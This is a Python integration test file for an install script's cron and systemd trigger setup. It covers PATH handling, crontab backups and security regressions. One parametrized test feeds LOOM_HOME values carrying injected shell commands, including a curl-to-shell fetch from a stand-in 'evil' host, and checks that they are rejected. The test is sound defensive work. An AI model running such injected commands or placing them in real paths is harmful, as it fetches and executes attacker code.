"""Integration tests for install.sh's periodic trigger and ``--update`` (phase 2, R2.2.2 /
R2.4.1).

Hard rules for these tests (same as ``test_hook_install.py``, plus one more):
- ``HOME``/``LOOM_HOME`` always point at a tmpdir; ``LOOM_SKIP_VENV=1`` unless the test is
  specifically about the venv branch.
- **The host schedulers are never the real ones.** Every test runs with a PATH whose head is
  a shim directory and whose tail is an allowlist of symlinks, so the developer's own
  ``crontab``/``systemctl`` are unreachable — a test must never write a real cron entry.
- ``git pull --ff-only`` runs against a *local* mini-checkout built here (no network, no
  clone of the whole repo).

They cover the edges around the frozen goal (``test/waves/b/test_goal_e2_install_doctor.py``):
scheduler-less hosts, the ``LOOM_SKIP_TRIGGER`` seam, stale cron blocks, and ``--update``'s
error/exit-code contract.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[3]
INSTALL_SCRIPT = REPO_ROOT / "client" / "install.sh"
CRON_TAG = "# loom-process"

# Everything install.sh needs from a checkout; a mini-repo is far cheaper than cloning
# the real one and keeps `git pull --ff-only` local.
CHECKOUT_FILES = (
    "client/install.sh",
    "client/hooks/sessionend.sh",
    "client/skills/loom/SKILL.md",
    "client/skills/loom-register/SKILL.md",
    "client/skills/loom-feedback/SKILL.md",   # slice F: step 3 ships /loom-feedback
    "client/timer/loom-process.service",
    "client/timer/loom-process.timer",
    # Step 3 copies every prompt: v1 keeps shipping for configs pinned to it and
    # v2/v3/v4/digest ship next to it (T.F3 `t-prompt-shipping`, D11, D15).
    "prompts/summarizer_v1.md",
    "prompts/summarizer_v2.md",
    "prompts/summarizer_v3.md",
    "prompts/summarizer_v4.md",
    "prompts/digest_v1.md",
)

GIT_ENV = {
    "GIT_AUTHOR_NAME": "test", "GIT_AUTHOR_EMAIL": "t@x",
    "GIT_COMMITTER_NAME": "test", "GIT_COMMITTER_EMAIL": "t@x",
}


# --------------------------------------------------------------------------- #
# PATH sandbox: shims + an allowlist, so no real scheduler is reachable        #
# --------------------------------------------------------------------------- #
SAFE_TOOLS = (
    "python3", "git", "jq", "bash", "sh", "env", "cat", "mv", "cp", "mkdir", "rm",
    "date", "diff", "grep", "sed", "chmod", "uname", "dirname", "basename", "head",
    "tail", "tr", "wc", "sort", "touch", "ln", "sleep", "mktemp", "readlink", "id",
    "awk", "cut", "find",
)


def _sandbox_path(tmp_path: Path, *extra: Path) -> str:
    shims = tmp_path / "shims"
    shims.mkdir(exist_ok=True)
    safe = tmp_path / "safe_bin"
    safe.mkdir(exist_ok=True)
    for name in SAFE_TOOLS:
        target = shutil.which(name)
        if target and not (safe / name).exists():
            (safe / name).symlink_to(target)
    # Only the explicit shims may provide a scheduler; the allowlist never does.
    assert shutil.which("crontab", path=str(safe)) is None
    assert shutil.which("systemctl", path=str(safe)) is None
    parts = [str(shims), str(safe), *(str(p) for p in extra)]
    return os.pathsep.join(parts)


def _fake_gitleaks_dir(tmp_path: Path, name: str = "toolbox") -> Path:
    """A controlled directory holding an executable called ``gitleaks``.

    The trigger-parity mechanism is about PATH RESOLUTION, not about running the scanner,
    so a stub is enough here — and it keeps these tests independent of whether the build
    host has the real binary (the frozen goal covers the real one).
    """
    d = tmp_path / name
    d.mkdir(parents=True, exist_ok=True)
    stub = d / "gitleaks"
    stub.write_text("#!/bin/sh\necho 8.30.1\n", encoding="utf-8")
    stub.chmod(0o755)
    return d


def _assignments(lines) -> dict:
    """``KEY=VALUE`` crontab environment-assignment lines, as a dict."""
    out = {}
    for line in lines:
        stripped = line.strip()
        if stripped.startswith("#") or "=" not in stripped:
            continue
        key, _, value = stripped.partition("=")
        if key and all(c.isalnum() or c == "_" for c in key):
            out[key] = value
    return out


def _crontab_shim(tmp_path: Path, state: Path, *, list_fails: str | None = None) -> None:
    """File-backed fake ``crontab``: ``-l`` prints the state (exit 1 with the real
    "no crontab for <user>" message when there is none), ``-`` replaces it from stdin.

    ``list_fails`` makes ``-l`` fail with that stderr text and exit 1 instead — the shape of
    a denied spool / cron.deny / TCC refusal, which must NOT be read as "empty crontab".
    """
    shim = tmp_path / "shims" / "crontab"
    shim.parent.mkdir(exist_ok=True)
    shim.write_text(
        "#!/usr/bin/env python3\n"
        "import sys, pathlib\n"
        f"state = pathlib.Path({str(state)!r})\n"
        f"list_fails = {list_fails!r}\n"
        "if '-l' in sys.argv[1:]:\n"
        "    if list_fails is not None:\n"
        "        sys.stderr.write(list_fails + '\\n')\n"
        "        sys.exit(1)\n"
        "    if state.exists():\n"
        "        sys.stdout.write(state.read_text())\n"
        "        sys.exit(0)\n"
        "    sys.stderr.write('crontab: no crontab for tester\\n')\n"
        "    sys.exit(1)\n"
        "state.write_text(sys.stdin.read())\n",
        encoding="utf-8",
    )
    shim.chmod(0o755)


def _systemctl_shim(tmp_path: Path, log: Path) -> None:
    """Fake ``systemctl`` that always succeeds and records every invocation."""
    shim = tmp_path / "shims" / "systemctl"
    shim.parent.mkdir(exist_ok=True)
    shim.write_text(
        "#!/usr/bin/env python3\n"
        "import sys, pathlib\n"
        f"log = pathlib.Path({str(log)!r})\n"
        "with log.open('a') as fh:\n"
        "    fh.write(' '.join(sys.argv[1:]) + '\\n')\n"
        "if 'is-system-running' in sys.argv[1:]:\n"
        "    sys.stdout.write('running\\n')\n",
        encoding="utf-8",
    )
    shim.chmod(0o755)


def _loom_stub(loom_home: Path, exit_code: int, record: Path) -> None:
    """Fake installed CLI at ``$LOOM_HOME/venv/bin/loom`` recording its argv."""
    loom = loom_home / "venv" / "bin" / "loom"
    loom.parent.mkdir(parents=True, exist_ok=True)
    loom.write_text(
        "#!/usr/bin/env python3\n"
        "import sys, pathlib\n"
        f"pathlib.Path({str(record)!r}).write_text(' '.join(sys.argv[1:]))\n"
        f"sys.exit({exit_code})\n",
        encoding="utf-8",
    )
    loom.chmod(0o755)


def _mini_checkout(tmp_path: Path) -> Path:
    """A real git checkout of just what install.sh touches, with a working ``origin``."""
    src = tmp_path / "origin_work"
    for rel in CHECKOUT_FILES:
        dst = src / rel
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(REPO_ROOT / rel, dst)
    env = {**os.environ, **GIT_ENV}
    subprocess.run(["git", "init", "-q"], cwd=src, check=True, env=env)
    subprocess.run(["git", "add", "-A"], cwd=src, check=True, env=env)
    subprocess.run(["git", "commit", "-qm", "mini"], cwd=src, check=True, env=env)
    work = tmp_path / "work"
    subprocess.run(["git", "clone", "-q", str(src), str(work)], check=True, env=env)
    return work


def _run(tmp_path: Path, *args: str, script: Path | None = None,
         **extra_env: str) -> subprocess.CompletedProcess:
    home = tmp_path / "home"
    home.mkdir(exist_ok=True)
    env = {
        **os.environ,
        "HOME": str(home),
        "LOOM_HOME": str(home / ".loom"),
        "LOOM_SKIP_VENV": "1", "LOOM_SKIP_GITLEAKS": "1",
        "PATH": _sandbox_path(tmp_path),
        **GIT_ENV,
    }
    env.update(extra_env)
    return subprocess.run(
        ["bash", str(script or INSTALL_SCRIPT), "--yes", *args],
        env=env, capture_output=True, text=True, stdin=subprocess.DEVNULL, timeout=180,
    )


@pytest.fixture
def home(tmp_path) -> Path:
    h = tmp_path / "home"
    h.mkdir(exist_ok=True)
    return h


# --------------------------------------------------------------------------- #
# Trigger install — the cases around the frozen goal                           #
# --------------------------------------------------------------------------- #
def test_install_writes_the_tagged_cron_entry(tmp_path, home):
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    lines = state.read_text().splitlines()
    assert CRON_TAG in lines
    # The block is tag → environment assignments → command, in cron's required order (an
    # assignment applies to the entries that FOLLOW it). `LOOM_HOME=` makes the periodic
    # pass use the same home/queue/token as the interactive install — cron's own
    # environment carries none — and `PATH=` makes it resolve the same binaries (P2.F5).
    at = lines.index(CRON_TAG)
    assert lines[at + 1] == f"LOOM_HOME={home / '.loom'}"
    assert lines[at + 2].startswith("PATH=")
    assert lines[at + 3] == f"*/15 * * * * {home / '.loom'}/venv/bin/loom process --quiet"
    # ...and it is the LAST block, so neither assignment can leak into another entry.
    assert at + 3 == len(lines) - 1
    assert "5/5" in proc.stdout  # the trigger is a reported step, not a silent one


# --------------------------------------------------------------------------- #
# P2.F5 — the block carries the environment the unattended pass needs          #
# --------------------------------------------------------------------------- #
def test_cron_block_path_resolves_the_same_scanner_as_the_install_shell(tmp_path, home):
    """AC-F5.1. cron starts the pass with `/usr/bin:/bin`, so a gitleaks living anywhere
    else (homebrew, ~/.local/bin) is invisible to it and `engine=auto` silently degrades to
    regex — while the interactive doctor reports gitleaks ok (RUNBOOK §7 finding 1)."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    toolbox = _fake_gitleaks_dir(tmp_path)
    install_path = _sandbox_path(tmp_path, toolbox)

    proc = _run(tmp_path, PATH=install_path)

    assert proc.returncode == 0, proc.stderr
    assignments = _assignments(state.read_text().splitlines())
    assert "PATH" in assignments, "the block carries no PATH: the pass would run under cron's"
    assert shutil.which("gitleaks", path=assignments["PATH"]) == str(toolbox / "gitleaks"), (
        "the trigger's PATH must resolve the very binary the install shell resolved")
    # The venv's own bin comes first: it is both useful (the CLI's siblings) and the
    # line's identity marker for the filter.
    assert assignments["PATH"].split(os.pathsep)[0] == f"{home / '.loom'}/venv/bin"


def test_cron_block_path_is_never_a_hardcoded_host_guess(tmp_path, home):
    """The value is DERIVED from the install-time PATH; baking in /opt/homebrew or
    /usr/local would be right on the build host and wrong on the next one."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    toolbox = _fake_gitleaks_dir(tmp_path)

    proc = _run(tmp_path, PATH=_sandbox_path(tmp_path, toolbox))

    assert proc.returncode == 0, proc.stderr
    content = state.read_text()
    assert "/opt/homebrew" not in content and "/usr/local" not in content


def test_cron_block_path_drops_components_that_cannot_be_written_safely(tmp_path, home):
    """HIGH-2, amended for env-assignment lines: ':' is legal in a PATH value (cron reads
    it literally, no /bin/sh) but '%' — cron's "rest is stdin" separator — a CR or a space
    are not. One odd directory must be dropped, not poison the whole line and not abort the
    parity mechanism.

    Amended for the minimal trigger PATH (2026-10-19): only the directories needed binaries
    resolve from are carried, so an odd directory matters — and is reported — when a needed
    binary resolves from it. `claude` lives in the '%' directory here; it is left out, by
    name, instead of the old count of dropped components."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    toolbox = _fake_gitleaks_dir(tmp_path)
    poison = _tool_dir(tmp_path, "pct%dir", "claude", decoy=True)
    spaced = tmp_path / "has space"
    spaced.mkdir()

    proc = _run(tmp_path, PATH=_sandbox_path(tmp_path, toolbox, poison, spaced))

    assert proc.returncode == 0, proc.stderr
    content = state.read_text()
    assert "%" not in content and "\r" not in content
    assignments = _assignments(content.splitlines())
    assert str(poison) not in assignments["PATH"]
    assert str(spaced) not in assignments["PATH"]
    # ...and the safe components are still there, so parity survives the drop.
    assert shutil.which("gitleaks", path=assignments["PATH"]) == str(toolbox / "gitleaks")
    assert "'claude' resolves from a PATH directory" in proc.stderr, proc.stderr
    assert "left out of the trigger environment" in proc.stderr
    assert str(poison) not in proc.stderr, "the directory itself is never echoed"


def test_cron_block_path_carries_absolute_directories_only(tmp_path, home):
    """'.' and an empty component both mean "the current directory". Interactively that is
    the operator's call; in a pass that runs from $HOME every 15 minutes it turns a dropped
    file into an executable, so the trigger's copy takes absolute directories only."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    base = _sandbox_path(tmp_path)

    proc = _run(tmp_path, PATH=f".{os.pathsep}{base}{os.pathsep}{os.pathsep}rel/bin")

    assert proc.returncode == 0, proc.stderr
    value = _assignments(state.read_text().splitlines())["PATH"]
    components = value.split(os.pathsep)
    assert all(c.startswith("/") for c in components), components
    assert "." not in components and "rel/bin" not in components


def test_reinstall_is_a_byte_exact_fixpoint(tmp_path, home):
    """AC-F5.3. Two installs → one block: not just one tag, one of EVERY line — a second
    `PATH=` assignment would silently shadow the first for every following entry."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    toolbox = _fake_gitleaks_dir(tmp_path)
    path = _sandbox_path(tmp_path, toolbox)

    assert _run(tmp_path, PATH=path).returncode == 0
    first = state.read_text()
    assert _run(tmp_path, PATH=path).returncode == 0

    assert state.read_text() == first
    lines = first.splitlines()
    assert sum(line.startswith("PATH=") for line in lines) == 1
    assert sum(line.startswith("LOOM_HOME=") for line in lines) == 1
    assert lines.count(CRON_TAG) == 1


def test_a_foreign_path_assignment_survives_install_and_uninstall(tmp_path, home):
    """MEDIUM-6, extended to the new line. `PATH=` is a SHARED namespace, unlike
    `LOOM_HOME=`: removing our assignment by prefix would delete the user's own PATH line
    and quietly change what every one of their entries can run. Ours is recognised by the
    marker it carries, never by the prefix."""
    state = tmp_path / "cron.txt"
    foreign = "PATH=/foreign-keep/bin:/usr/bin"
    state.write_text(f"# nightly\n{foreign}\n@daily keepme.sh\n")
    _crontab_shim(tmp_path, state)

    assert _run(tmp_path).returncode == 0
    assert foreign in state.read_text().splitlines()

    assert _run(tmp_path, "--uninstall-trigger").returncode == 0
    assert state.read_text().splitlines() == ["# nightly", foreign, "@daily keepme.sh"]


def test_systemd_unit_carries_the_scanner_environment(tmp_path, home):
    """AC-F5.2. A systemd *user* service inherits the user manager's environment, not the
    installing shell's, so the timer needs the PATH written into the unit."""
    _systemctl_shim(tmp_path, tmp_path / "systemctl.log")
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    toolbox = _fake_gitleaks_dir(tmp_path)

    proc = _run(tmp_path, PATH=_sandbox_path(tmp_path, toolbox))

    assert proc.returncode == 0, proc.stderr
    unit = (home / ".config" / "systemd" / "user" / "loom-process.service").read_text()
    env = dict(
        line.strip()[len("Environment="):].split("=", 1)
        for line in unit.splitlines() if line.strip().startswith("Environment=")
    )
    assert env["LOOM_HOME"] == str(home / ".loom")
    assert shutil.which("gitleaks", path=env["PATH"]) == str(toolbox / "gitleaks")
    # Still a parsable [Service] section: one directive per line, no duplicates.
    body = unit.split("[Service]", 1)[1]
    assert body.count("Environment=PATH=") == 1
    assert body.count("Environment=LOOM_HOME=") == 1


# --------------------------------------------------------------------------- #
# The trigger's PATH is MINIMAL: the resolved tools' directories + system dirs #
# --------------------------------------------------------------------------- #
# What install.sh appends after the tools' directories, as literals (never the code's own
# constant): the standard system directories, and nothing else — no /usr/local, no
# homebrew prefix (the anti-host-guess rule of the frozen wave d).
SYSTEM_DIRS = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"]
# The bound install.sh enforces on the whole `PATH=` line: below the 998-byte assignment
# that macOS cron still accepts (cron.h MAX_ENVSTR 1000).
PATH_LINE_LIMIT = 900


def _tool_dir(tmp_path: Path, name: str, *tools: str, decoy: bool = False) -> Path:
    """A directory holding ``tools``: symlinks to the REAL binary (install.sh itself runs
    git, jq and python3, so a stub would break the install), or an inert stub for a tool
    the build host may not have (claude, gitleaks) or for a ``decoy``."""
    d = tmp_path / name
    d.mkdir(parents=True, exist_ok=True)
    for tool in tools:
        real = None if decoy else shutil.which(tool)
        if real:
            (d / tool).symlink_to(real)
        else:
            (d / tool).write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
            (d / tool).chmod(0o755)
    return d


def _filler_dirs(tmp_path: Path, n: int = 30) -> list[Path]:
    """Empty directories with long names, the shape of an nvm/homebrew/cryptex PATH."""
    out = []
    for i in range(n):
        d = tmp_path / "filler" / f"versions-node-v22.23.{i:02d}-darwin-arm64-cryptex-bin"
        d.mkdir(parents=True)
        out.append(d)
    return out


def _long_install_path(tmp_path: Path) -> tuple[str, list[str]]:
    """An install-time PATH over 1000 bytes and the trigger PATH it must produce.

    The tools sit in an order that differs from any fixed list (python3's dir first, the
    claude dir between the two git/jq ones), git and jq SHARE a directory, that directory
    appears twice, and a decoy ``claude`` sits in a directory AFTER the real one — so the
    expected value checks resolution order, de-duplication and first-hit-wins at once.
    """
    py = _tool_dir(tmp_path, "py_bin", "python3")
    gj = _tool_dir(tmp_path, "gitjq_bin", "git", "jq")
    cl = _tool_dir(tmp_path, "claude_bin", "claude")
    gl = _fake_gitleaks_dir(tmp_path, "gitleaks_bin")
    decoy = _tool_dir(tmp_path, "decoy_bin", "claude", decoy=True)
    filler = _filler_dirs(tmp_path)
    shims = tmp_path / "shims"
    shims.mkdir(exist_ok=True)
    safe_path = _sandbox_path(tmp_path)  # shims + allowlist (for sh, awk, mkdir, ...)
    parts = [str(shims), *map(str, filler[:15]), str(py), str(gj), str(cl), str(gj),
             str(decoy), *map(str, filler[15:]), str(gl), safe_path]
    install_path = os.pathsep.join(parts)
    loom_home = tmp_path / "home" / ".loom"
    expected = [f"{loom_home}/venv/bin", str(py), str(gj), str(cl), str(gl), *SYSTEM_DIRS]
    return install_path, expected


def test_trigger_path_is_the_tools_directories_plus_system_dirs_only(tmp_path, home):
    """The 2026-10-19 macOS finding: a 1040-byte install-time PATH copied into the block
    made macOS cron DROP the assignment (it ignores env lines of MAX_ENVSTR-1 bytes and
    more), so every pass ran on cron's /usr/bin:/bin and could not find gitleaks — nor
    claude. The trigger now carries only what the unattended pass resolves."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    install_path, expected = _long_install_path(tmp_path)
    assert len(install_path) > 1000, "fixture: the install-time PATH must be the long kind"

    proc = _run(tmp_path, PATH=install_path)

    assert proc.returncode == 0, proc.stderr
    lines = state.read_text().splitlines()
    path_lines = [line for line in lines if line.startswith("PATH=")]
    assert len(path_lines) == 1, lines
    assert len(path_lines[0]) <= PATH_LINE_LIMIT, len(path_lines[0])
    assert path_lines[0][len("PATH="):].split(os.pathsep) == expected
    # Nothing the install shell resolved is reported missing.
    assert "not on this shell's PATH" not in proc.stderr, proc.stderr


def test_trigger_path_leaves_out_gitleaks_when_loom_home_has_it(tmp_path, home):
    """D16: $LOOM_HOME/bin/gitleaks runs by absolute path, so its PATH directory is not
    something the trigger needs to carry."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    install_path, expected = _long_install_path(tmp_path)
    _fake_gitleaks_dir(tmp_path, "home/.loom/bin")

    proc = _run(tmp_path, PATH=install_path)

    assert proc.returncode == 0, proc.stderr
    value = _assignments(state.read_text().splitlines())["PATH"]
    assert value.split(os.pathsep) == [d for d in expected
                                       if d != str(tmp_path / "gitleaks_bin")]


def test_a_required_binary_missing_at_install_time_is_reported(tmp_path, home):
    """No `claude` anywhere on the install PATH: the install still completes (the
    operator may install claude next), but says so instead of writing a PATH that
    silently cannot run the summarizer."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    assert shutil.which("claude", path=_sandbox_path(tmp_path)) is None

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    assert "'claude' is not on this shell's PATH" in proc.stderr, proc.stderr
    assert CRON_TAG in state.read_text().splitlines()


def test_the_configured_claude_bin_is_the_one_resolved(tmp_path, home):
    """`claude_bin` in config.json is the binary the processor runs. A bare name is
    resolved through PATH like `claude`; the default name is then irrelevant."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    mine = _tool_dir(tmp_path, "my_claude_bin", "my-claude", decoy=True)
    (home / ".loom").mkdir(parents=True)
    (home / ".loom" / "config.json").write_text('{"claude_bin": "my-claude"}\n')

    proc = _run(tmp_path, PATH=_sandbox_path(tmp_path, mine))

    assert proc.returncode == 0, proc.stderr
    value = _assignments(state.read_text().splitlines())["PATH"]
    assert str(mine) in value.split(os.pathsep)
    assert "'claude' is not on this shell's PATH" not in proc.stderr
    assert "'my-claude' is not on this shell's PATH" not in proc.stderr


def test_an_absolute_claude_bin_needs_no_path_entry(tmp_path, home):
    """An absolute `claude_bin` is executed as is (no PATH lookup), so it adds no
    directory — and it is reported when it is not executable."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    (home / ".loom").mkdir(parents=True)
    missing = tmp_path / "nowhere" / "claude"
    (home / ".loom" / "config.json").write_text(f'{{"claude_bin": "{missing}"}}\n')

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    value = _assignments(state.read_text().splitlines())["PATH"]
    assert str(missing.parent) not in value
    assert f"'{missing}' is not executable" in proc.stderr, proc.stderr


def _over_limit_path(tmp_path: Path) -> str:
    """Tools in directories so deep that even the minimal trigger PATH is too long."""
    deep = "very-long-directory-name-" * 6
    cl = _tool_dir(tmp_path, f"{deep}/a/{deep}/claude", "claude")
    gj = _tool_dir(tmp_path, f"{deep}/b/{deep}/gitjq", "git", "jq")
    py = _tool_dir(tmp_path, f"{deep}/c/{deep}/py", "python3")
    return _sandbox_path(tmp_path, cl, gj, py).replace(
        str(tmp_path / "safe_bin"), os.pathsep.join([str(cl), str(gj), str(py),
                                                     str(tmp_path / "safe_bin")]))


def test_a_trigger_path_over_the_limit_fails_loudly_and_writes_nothing(tmp_path, home):
    """Writing a line the scheduler will drop is the silent failure this replaces: the
    install must stop, say why, and leave the crontab exactly as it was."""
    state = tmp_path / "cron.txt"
    original = "# precious\n0 3 * * * /opt/keep.sh\n"
    state.write_text(original)
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path, PATH=_over_limit_path(tmp_path))

    assert proc.returncode != 0
    assert "trigger PATH" in proc.stderr and str(PATH_LINE_LIMIT) in proc.stderr, proc.stderr
    assert state.read_text() == original
    assert "cron entry installed" not in proc.stdout


def test_a_trigger_path_over_the_limit_fails_the_systemd_branch_too(tmp_path, home):
    _systemctl_shim(tmp_path, tmp_path / "systemctl.log")
    _crontab_shim(tmp_path, tmp_path / "cron.txt")

    proc = _run(tmp_path, PATH=_over_limit_path(tmp_path))

    assert proc.returncode != 0
    assert "trigger PATH" in proc.stderr, proc.stderr
    assert not (home / ".config" / "systemd" / "user" / "loom-process.service").exists()


def test_systemd_unit_gets_the_same_minimal_path(tmp_path, home):
    """Parity between the branches: the unit's `Environment=PATH=` is the very value the
    crontab block would carry."""
    _systemctl_shim(tmp_path, tmp_path / "systemctl.log")
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    install_path, expected = _long_install_path(tmp_path)

    proc = _run(tmp_path, PATH=install_path)

    assert proc.returncode == 0, proc.stderr
    unit = (home / ".config" / "systemd" / "user" / "loom-process.service").read_text()
    env = dict(
        line.strip()[len("Environment="):].split("=", 1)
        for line in unit.splitlines() if line.strip().startswith("Environment=")
    )
    assert env["PATH"].split(os.pathsep) == expected
    assert not (tmp_path / "cron.txt").exists(), "one trigger, one owner"


def test_install_replaces_a_stale_loom_block_in_place(tmp_path, home):
    """A re-install after LOOM_HOME moved must not leave the old command behind."""
    state = tmp_path / "cron.txt"
    state.write_text(
        "# keep-me\n"
        "0 3 * * * /usr/local/bin/backup.sh\n"
        f"{CRON_TAG}\n"
        "*/15 * * * * /somewhere/else/venv/bin/loom process --quiet\n"
        "# trailing-entry\n"
        "@reboot /usr/local/bin/other.sh\n"
    )
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    content = state.read_text()
    assert content.count(CRON_TAG) == 1
    assert "/somewhere/else/" not in content, "the stale loom command survived"
    assert str(home / ".loom") in content
    # every unrelated entry is preserved, including the ones after the loom block
    for kept in ("# keep-me", "backup.sh", "# trailing-entry", "other.sh"):
        assert kept in content


def test_loom_skip_trigger_installs_nothing(tmp_path, home):
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path, LOOM_SKIP_TRIGGER="1")

    assert proc.returncode == 0, proc.stderr
    assert not state.exists(), "LOOM_SKIP_TRIGGER=1 still wrote a crontab"
    assert not (home / ".config" / "systemd" / "user").exists()
    assert "LOOM_SKIP_TRIGGER" in proc.stdout


def test_install_succeeds_on_a_host_with_no_scheduler(tmp_path, home):
    """No systemctl and no crontab: warn, but the rest of the install still succeeds."""
    proc = _run(tmp_path)  # no crontab shim written

    assert proc.returncode == 0, proc.stderr
    assert "WARNING" in proc.stderr
    # the frozen phase-1 outcome is untouched
    assert (home / ".claude" / "settings.json").is_file()
    assert (home / ".loom" / "hooks" / "sessionend.sh").is_file()


def test_unknown_argument_still_exits_2(tmp_path):
    proc = _run(tmp_path, "--nope")
    assert proc.returncode == 2
    assert "unknown argument" in proc.stderr


# --------------------------------------------------------------------------- #
# Security review regressions — crontab data loss and injection               #
# --------------------------------------------------------------------------- #
def test_unreadable_crontab_never_destroys_it(tmp_path, home):
    """HIGH-1. `crontab -l` failing for any reason OTHER than "no crontab yet" must not be
    read as "empty crontab": rebuilding from empty would wipe every existing entry."""
    state = tmp_path / "cron.txt"
    state.write_text("# precious\n0 3 * * * /usr/local/bin/payroll.sh\n")
    _crontab_shim(tmp_path, state, list_fails="crontab: you (tester) are not allowed to use this program")

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr  # the rest of the install still succeeds
    # untouched, byte for byte
    assert state.read_text() == "# precious\n0 3 * * * /usr/local/bin/payroll.sh\n"
    assert CRON_TAG not in state.read_text()
    assert "refusing to write" in proc.stderr
    assert "WARNING" in proc.stderr
    # and it must not have claimed success
    assert "cron entry installed" not in proc.stdout


def test_crontab_is_backed_up_before_every_write(tmp_path, home):
    """HIGH-1. The crontab is a shared resource with no undo — back it up like settings.json."""
    state = tmp_path / "cron.txt"
    original = "# precious\n0 3 * * * /usr/local/bin/payroll.sh\n"
    state.write_text(original)
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    backups = sorted((home / ".loom" / "backup").glob("crontab.*"))
    assert len(backups) == 1, "no timestamped crontab backup was taken"
    assert backups[0].read_text() == original
    assert str(backups[0]) in proc.stdout


def test_no_backup_taken_when_there_was_no_crontab(tmp_path, home):
    """Nothing to lose, nothing to write: no empty backup files accumulating."""
    _crontab_shim(tmp_path, tmp_path / "cron.txt")

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    backup_dir = home / ".loom" / "backup"
    assert not backup_dir.exists() or list(backup_dir.glob("crontab.*")) == []


@pytest.mark.parametrize("suffix", [
    "x;curl http://evil/p|sh;#",
    "x`id`",
    "x$(id)",
    "x && curl http://evil/p",
    "has space/.loom",
    "pct%stdin",
])
def test_shell_metacharacters_in_loom_home_never_reach_the_scheduler(tmp_path, suffix):
    """HIGH-2. cron hands its command field to /bin/sh, so `;`, `|`, `&&`, backticks and
    `$( )` in LOOM_HOME would run attacker code every 15 minutes; a bare space breaks the
    argv; `%` is cron's stdin separator. Whitelist the path, don't try to escape it."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    sysd_log = tmp_path / "systemctl.log"
    _systemctl_shim(tmp_path, sysd_log)  # the guard must cover the systemd branch too
    evil = f"{tmp_path}/{suffix}"  # under tmp_path: the run really does create this tree

    proc = _run(tmp_path, LOOM_HOME=evil)

    assert proc.returncode == 0, proc.stderr
    assert not state.exists(), "an unsafe LOOM_HOME reached the crontab"
    assert not sysd_log.exists(), "an unsafe LOOM_HOME still talked to systemd"
    assert "WARNING" in proc.stderr
    assert "cron entry installed" not in proc.stdout
    # the untrusted value is not echoed back in the rejection (terminal escape hygiene)
    assert evil not in proc.stderr


def test_leading_dash_loom_home_never_yields_a_scheduler_entry(tmp_path):
    """HIGH-2. A path starting with '-' would be read as an option. It never gets that far
    (mkdir rejects it in step 1) but it must never produce a trigger either."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path, LOOM_HOME="-dash/loom")

    assert proc.returncode != 0, "a nonsensical LOOM_HOME must not report success"
    assert not state.exists()


def test_a_users_line_after_a_literal_loom_tag_survives(tmp_path, home):
    """MEDIUM-6. Deleting "the line after the tag" destroys an unrelated entry in any
    hand-edited crontab that happens to carry a literal `# loom-process` comment."""
    state = tmp_path / "cron.txt"
    state.write_text(
        f"{CRON_TAG}\n"
        "0 3 * * * /usr/local/bin/IMPORTANT-backup.sh\n"
        "@daily /usr/local/bin/other.sh\n"
    )
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    content = state.read_text()
    assert "IMPORTANT-backup.sh" in content, "an unrelated entry was deleted by position"
    assert "other.sh" in content
    assert content.count(CRON_TAG) == 1


def test_a_hand_edited_loom_cadence_is_replaced_not_duplicated(tmp_path, home):
    """MEDIUM-6. Identity, not position: our command is recognised whatever its schedule."""
    state = tmp_path / "cron.txt"
    state.write_text(
        "# keep\n@reboot /usr/local/bin/x.sh\n"
        "0 */2 * * * /old/home/.loom/venv/bin/loom process --quiet\n"
    )
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    content = state.read_text()
    assert "/old/home/" not in content, "the stale loom command survived"
    assert sum("loom process" in line for line in content.splitlines()) == 1
    assert "x.sh" in content


def test_reinstall_does_not_accumulate_loom_home_lines(tmp_path, home):
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)

    _run(tmp_path)
    proc = _run(tmp_path)

    assert proc.returncode == 0, proc.stderr
    lines = state.read_text().splitlines()
    assert sum(line.startswith("LOOM_HOME=") for line in lines) == 1
    assert lines.count(CRON_TAG) == 1


# --------------------------------------------------------------------------- #
# --uninstall-trigger (MEDIUM-4: the documented recipe was a no-op)            #
# --------------------------------------------------------------------------- #
def test_uninstall_trigger_removes_the_block_and_keeps_the_rest(tmp_path, home):
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    assert _run(tmp_path).returncode == 0
    # a user entry added afterwards must survive the removal
    state.write_text(state.read_text() + "@daily /usr/local/bin/other.sh\n")

    proc = _run(tmp_path, "--uninstall-trigger")

    assert proc.returncode == 0, proc.stderr
    content = state.read_text()
